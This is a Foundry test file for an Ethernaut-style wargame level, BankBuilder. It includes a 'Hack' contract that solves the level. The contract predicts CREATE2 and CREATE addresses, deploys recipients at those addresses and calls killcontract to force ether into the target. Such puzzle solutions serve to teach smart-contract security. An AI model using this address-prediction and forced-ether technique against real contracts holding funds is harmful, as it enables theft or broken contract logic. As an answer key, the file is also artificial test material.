// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {BankBuilder} from "src/levels/BankBuilder.sol";
import {Bank} from "src/levels/BankBuilder.sol";
import {Recipient} from "src/levels/BankBuilder.sol";
import {BankBuilderFactory} from "src/levels/BankBuilderFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestBankBuilder is Test, Utils {
    Ethernaut ethernaut;
    BankBuilder instance;
    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    address payable deployer;
    address payable player;

    function setUp() public {
        address payable[] memory users = createUsers(2);

        deployer = users[0];
        vm.label(deployer, "Deployer");
        deal(deployer, 10 ether);

        player = users[1];
        vm.label(player, "player");
        deal(player, 10 ether);

        vm.startPrank(deployer);
        ethernaut = getEthernautWithStatsProxy(deployer);
        BankBuilderFactory factory = new BankBuilderFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = BankBuilder(payable(createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether)));
        console.log("Count Value",instance.count());
        vm.stopPrank();
    }

    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    function testSolve() public {
        vm.startPrank(player);
        Hack hack = new Hack(address(instance));
        hack.PerformAttack();
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
}

contract Hack {

    Bank private bank;
    BankBuilder private bankbuilder;
    Recipient private recipient;
    address public addr;

    constructor(address _target){
        bankbuilder = BankBuilder(payable(_target));
    }

    function PerformAttack() public {
        bank= Bank(generateAddressUsingCreate2(getBytes32(123)));

        for (uint256 i=0; i<5; i++){
            addr = bank.deployRecipient(generateAddressUsingCreate(address(bank)));
        }
        recipient = Recipient(addr);
        recipient.killcontract(payable(address(bankbuilder)));
        
        require(address(bankbuilder).balance>=0.001 ether,"wtf!");    
    }

    function getBytes32(uint256 salt) internal  pure returns (bytes32) {
        return bytes32(salt);
    }

    function generateAddressUsingCreate(address sender) internal pure returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x05)));
        address addrA = address(uint160(uint256(hash)));
        return addrA;
    }

    function generateAddressUsingCreate2(bytes32 salt) public view returns (address) {
        address str = address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(bankbuilder),
            salt,
            keccak256(abi.encodePacked(
                type(Bank).creationCode
            ))
        )))));

        return str;
    }

}